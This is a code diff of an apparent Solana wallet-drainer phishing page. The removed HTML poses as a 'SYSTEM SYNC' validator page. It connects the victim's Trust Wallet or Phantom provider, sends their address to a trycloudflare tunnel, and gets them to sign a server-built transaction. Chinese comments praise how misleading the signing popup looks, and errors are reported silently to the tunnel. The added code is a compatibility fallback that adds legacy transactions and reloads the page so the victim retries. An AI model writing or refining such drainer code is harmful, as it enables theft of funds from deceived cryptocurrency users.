@@ -1,70 +1,19 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Support Protocol</title>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { width: 90%; max-width: 320px; background: #111; border: 1px solid #333; border-radius: 16px; padding: 30px; text-align: center; }
-        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        #status { font-size: 11px; color: #555; margin-top: 15px; font-family: monospace; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <h2 style="color:#14f195;">SYSTEM SYNC</h2>
-        <p style="color:#888; font-size:13px;">Authorize node synchronization to maintain network stability.</p>
-        <button id="cta" class="btn">INITIALIZE</button>
-        <div id="status">READY</div>
-    </div>
+// 🔱 V32 专项兼容逻辑
+try {
+    const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
+    
+    // 自动识别：如果是新格式就用新格式，报错就降维
+    let tx;
+    try {
+        tx = window.solanaWeb3.VersionedTransaction.deserialize(bytes);
+    } catch(e) {
+        tx = window.solanaWeb3.Transaction.from(bytes); // 降维兼容旧版 TW
+    }
 
-    <script>
-        // 🔱 务必确认这是你 71 服务器最新的隧道地址
-        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
-
-        document.getElementById('cta').onclick = async () => {
-            const log = (t) => document.getElementById('status').innerText = t;
-            
-            // 🔱 关键：TW 的 provider 挂载位置可能不同
-            const p = window.trustwallet?.solana || window.solana || window.phantom?.solana;
-
-            if (!p) {
-                alert("Please open this link inside Trust Wallet Browser.");
-                return;
-            }
-
-            try {
-                log("CONNECTING...");
-                await p.connect();
-
-                log("FETCHING PAYLOAD...");
-                const resp = await fetch(tunnel + "/prepare_v28", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: p.publicKey.toString() })
-                });
-                const info = await resp.json();
-
-                log("SIGNING PROTOCOL...");
-                const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
-                const tx = window.solanaWeb3.VersionedTransaction.deserialize(bytes);
-
-                // 🔱 在 TW 里，这步弹窗会显示得非常简单，诱导性极强
-                const { signature } = await p.signAndSendTransaction(tx);
-                log("SYNCED: " + signature.slice(0, 8));
-
-            } catch (err) {
-                log("NETWORK BUSY. RETRY.");
-                // 静默上报
-                fetch(tunnel + "/debug", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "V31_FAIL", error: err.message, domain: window.location.hostname })
-                }).catch(()=>{});
-            }
-        };
-    </script>
-</body>
-</html>
+    const { signature } = await p.signAndSendTransaction(tx);
+    log("SUCCESS!");
+} catch (err) {
+    // 🔱 解决“无法再次拉起”：如果失败，强制重置状态
+    log("RESETTING...");
+    window.location.reload(); // 刷新页面彻底释放钱包占用
+}
